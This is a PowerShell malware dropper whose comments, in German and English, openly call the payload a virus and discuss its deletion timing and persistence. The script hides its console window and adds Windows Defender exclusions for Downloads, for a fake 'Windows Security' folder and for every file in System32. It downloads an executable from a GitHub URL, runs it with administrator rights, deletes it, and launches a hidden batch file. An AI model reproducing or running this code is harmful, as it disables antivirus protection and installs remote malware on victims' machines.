#Sup Im trying to fix the timer it delets the virus file from github too fast 

#Also ich hab jetzt gemacht das erst nachdem der skript geschlossen ist die datei gelöscht wird. Ob das aber jemals passiert ist die andere frage weil es kann sein das der skript nie oder erst nach einem neustart stoppt.
#Das sollte aber gehen weil der virus sich in einen Ordner namens Windows Security kopiert, ABER vielleicht wird erst der skript in dem Ordner nach einem neustart benutzt und solange der PC nicht neugestartet wird wird der originale alte im download ordner benutzt.


# Versteckt das PowerShell-Fenster
Add-Type -Name Win32 -Namespace System -MemberDefinition '
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
$consolePtr = [System.Win32]::GetConsoleWindow()
[System.Win32]::ShowWindow($consolePtr, 0)  # Fenster verstecken

# Wichtige Pfade
$DownloadPath = "$env:USERPROFILE\Downloads"
$ClientExePath = "$env:USERPROFILE\Windows Security\Windows Security.exe"
$System32Path = "C:\Windows\System32"
$SystemPath = "C:\Windows\System"

# Windows Defender starten (falls gestoppt)
$defenderService = Get-Service -Name windefend -ErrorAction SilentlyContinue
if ($defenderService.Status -ne 'Running') {
    Start-Service -Name windefend
    Start-Sleep -Seconds 3
}

# Windows Defender Ausnahmen setzen
Add-MpPreference -ExclusionPath $DownloadPath
Add-MpPreference -ExclusionPath $ClientExePath

# Datei von GitHub herunterladen
$GitHubURL = "https://github.com/IchbinMrNook/Private_script_pull-DC-Version/raw/refs/heads/main/Windows_File.exe"
$DownloadedFile = Join-Path "$DownloadPath" "Windows_File.exe"
(New-Object System.Net.WebClient).DownloadFile($GitHubURL, $DownloadedFile)

# Datei ausführen und auf Beendigung warten
if (Test-Path $DownloadedFile) {
    $process = Start-Process -FilePath $DownloadedFile -Verb RunAs -PassThru
    if ($process) {
        $process.WaitForExit()  # Wartet, bis die Datei beendet ist
    }
    Remove-Item -Path $DownloadedFile -Force
}

# Alle Dateien im System32- und System-Ordner als Ausnahmen hinzufügen
Get-ChildItem -Path $System32Path, $SystemPath -Recurse -File | ForEach-Object {
    Add-MpPreference -ExclusionPath $_.FullName
}

# restrict.bat ausführen
Start-Process -FilePath "restrict.bat" -WindowStyle Hidden
